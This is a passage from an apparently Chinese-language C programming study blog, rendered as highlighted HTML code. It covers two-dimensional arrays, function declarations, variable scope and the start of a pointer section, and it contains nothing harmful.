class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.二维数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">int a[3][4];</span></span><br><span class="line"><span class="comment">总共12个元素，可以当做3行4列看待，依次是:</span></span><br><span class="line"><span class="comment">a[0][0],a[0][1],a[0][2],a[0][3]</span></span><br><span class="line"><span class="comment">a[1][0],a[1][1],a[1][2],a[1][3]</span></span><br><span class="line"><span class="comment">a[2][0],a[2][1],a[2][2],a[2][3]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a[i][j]  ==&gt; i+1行，j+1列的元素</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int a[m][n];  该二位数组的右下角位置的元素只能是a[m-1][n-1]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_double</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.最笨的初始化</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.分开写（格式要写正确）</span></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">3</span>][<span class="number">4</span>]=&#123;</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">&#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.其他各种初始化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出二维数组内容</span></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">4</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%-5d \t"</span>, b[i][j]);    <span class="comment">// 付好：左对齐，5代表占5个位置（这不是重点，格式控制有其他控制办法）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);  <span class="comment">// 格式化(每四个一行)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维数组排序</span></span><br><span class="line"><span class="comment">//求每一行最大值</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 不存在! 因为内存是线性一维的</span></span><br><span class="line"><span class="comment">2. n维数组可以当做 每个元素是n-1维数组的一维数组 的数组</span></span><br><span class="line"><span class="comment">比如：a[3][4]，可以当做含有三个元素的一维数组，只不过每个元素都可以划分为4个小元素</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>func.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">after_func</span><span class="params">()</span></span>;   <span class="comment">// 函数的声明， 可以不写变量名</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_max</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;  <span class="comment">// 函数声明，记得加分号</span></span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"func.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">before_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是函数测试，在主函数之前定义的。"</span>);</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义写在主函数之前的时候，那么就无需在主函数里面声明这个函数，只需要把函数体写在主函数前即可</span></span><br><span class="line"><span class="comment">//否则，需要先声明.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此函数定义在主函数之前，直接调用即可，无须声明</span></span><br><span class="line"><span class="comment">//before_func();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在主函数之后定义的，需要先声明才能调用。</span></span><br><span class="line"><span class="comment">//1.声明(要放在main外面，我放在了自定义的头文件里面)</span></span><br><span class="line"><span class="comment">//2.调用</span></span><br><span class="line"><span class="comment">//after_func();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最大值</span></span><br><span class="line"><span class="comment">//int i,j;</span></span><br><span class="line"><span class="comment">//i=5;j=10;</span></span><br><span class="line"><span class="comment">//get_max(i, j);</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">get_max(i,i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">after_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是函数测试，在主函数之后定义的，需要先声明才能调用。"</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//求最大值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> max_val = a&gt;b?a:b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d和%d比较，最大值为: %d \n"</span>, a,b,max_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">return和break的区别：</span></span><br><span class="line"><span class="comment">1.break:循环、switch</span></span><br><span class="line"><span class="comment">2.return终止函数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数的分类：</span></span><br><span class="line"><span class="comment">1.有参函数和无参函数</span></span><br><span class="line"><span class="comment">2.有返回值和无返回值</span></span><br><span class="line"><span class="comment">3.库函数和用户自定义函数</span></span><br><span class="line"><span class="comment">4.普通函数和主函数(main)：一个程序只能有一个主函数，主函数既是程序的入口，也是程序的出口</span></span><br><span class="line"><span class="comment">主函数能调用主函数，其他函数不能调用main函数，普通函数可以相互调用</span></span><br><span class="line"><span class="comment">5.值传递和引用传递(其实这样说是不对的)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如何在软件开发中，合理的设计函数来解决实际问题：</span></span><br><span class="line"><span class="comment">功能划分的详细一些，提高利用率</span></span><br><span class="line"><span class="comment">函数是C语言的基本单位，类是Java，C#等的基本单位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">常用的系统函数:</span></span><br><span class="line"><span class="comment">1. doulbe sqrt(double x)           求x的平方根</span></span><br><span class="line"><span class="comment">2. int abs(int x)   求整数的绝对值</span></span><br><span class="line"><span class="comment">3. double fabs(double x)       </span></span><br><span class="line"><span class="comment">推荐书籍：</span></span><br><span class="line"><span class="comment">机械工业出版社：《turboc2.0使用大全》</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">递归：</span></span><br><span class="line"><span class="comment">栈：先进先出</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">变量的作用于和存储方式：</span></span><br><span class="line"><span class="comment">1.按作用域分：全局变量，局部变量（函数内部定义的变量/函数的形参）</span></span><br><span class="line"><span class="comment">2.按变量的存储方式：静态变量，自动变量，寄存器变量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> k=<span class="number">99</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_var</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//局部变量与全局变量命名相同：局部变量会屏蔽掉全局变量</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p>test.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base_pointer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange_two</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange1</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange2</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_exchange3</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">two_pointer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo3</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo4</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo5</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dynami_memo6</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"test.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//base_pointer();</span></span><br><span class="line">exchange_two();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> * q; <span class="comment">// q是变量名, int *表示q变量存放的是int类型变量的地址（int * 是数据类型）</span></span><br><span class="line"><span class="comment">// 错误写法：q=55;   后面不能是值，只能跟地址</span></span><br><span class="line">q=&amp;j;   <span class="comment">//*q与j是等同的</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.q保存了j的地址，引起：q指向j。</span></span><br><span class="line"><span class="comment">2.q不是j，j不是q。修改q的值不会影响j,修改j的值也不会影响q的值</span></span><br><span class="line"><span class="comment">3.如果一个指针变量指向一个普通变量，则*指针变量完全等同于普通变量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span 